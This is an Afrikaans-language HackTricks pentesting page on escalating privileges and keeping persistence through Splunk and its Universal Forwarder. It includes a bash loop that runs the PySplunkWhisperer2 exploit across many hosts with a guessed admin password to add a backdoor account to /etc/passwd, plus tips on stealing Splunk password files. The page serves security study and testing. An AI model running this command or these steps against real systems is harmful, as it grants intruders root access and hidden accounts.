# Splunk LPE en Volharding

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

As jy **'n masjien intern of ekstern opneem** en jy vind **Splunk wat loop** (poort 8090), as jy gelukkig enige **geldige akrediteer** ken, kan jy die **Splunk diens misbruik** om **'n shell** as die gebruiker wat Splunk loop, uit te voer. As root dit loop, kan jy voorregte na root opgradeer.

Ook, as jy **alreeds root is en die Splunk diens nie net op localhost luister nie**, kan jy die **wagwoord** lêer **van** die Splunk diens **steel** en die wagwoorde **kraak**, of **nuwe** akrediteer aan dit **toevoeg**. En volharding op die gasheer handhaaf.

In die eerste beeld hieronder kan jy sien hoe 'n Splunkd webblad lyk.



## Splunk Universele Voorouer Agent Exploit Samevatting

Vir verdere besonderhede, kyk die pos [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Dit is net 'n samevatting:

**Exploit Oorsig:**
'n Exploit wat die Splunk Universele Voorouer Agent (UF) teiken, laat aanvallers met die agent wagwoord toe om arbitrêre kode op stelsels wat die agent loop, uit te voer, wat moontlik 'n hele netwerk in gevaar stel.

**Belangrike Punten:**
- Die UF agent valideer nie inkomende verbindings of die egtheid van kode nie, wat dit kwesbaar maak vir ongeoorloofde kode-uitvoering.
- Algemene wagwoord verkrygingsmetodes sluit in om dit in netwerk gidse, lêer deel, of interne dokumentasie te vind.
- Suksevolle uitbuiting kan lei tot SYSTEM of root vlak toegang op gecompromitteerde gashere, data uitvloeiing, en verdere netwerk infiltrasie.

**Exploit Uitvoering:**
1. Aanvaller verkry die UF agent wagwoord.
2. Gebruik die Splunk API om opdragte of skripte na die agente te stuur.
3. Moglike aksies sluit lêer ekstraksie, gebruiker rekening manipulasie, en stelsel kompromie in.

**Impak:**
- Volledige netwerk kompromie met SYSTEM/root vlak toestemmings op elke gasheer.
- Potensiaal om logging te deaktiveer om opsporing te ontduik.
- Installering van agterdeure of ransomware.

**Voorbeeld Opdrag vir Uitbuiting:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Gebruikbare openbare exploits:**
* https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
* https://www.exploit-db.com/exploits/46238
* https://www.exploit-db.com/exploits/46487


## Misbruik van Splunk-vrae

**Vir verdere besonderhede, kyk na die pos [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsieplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
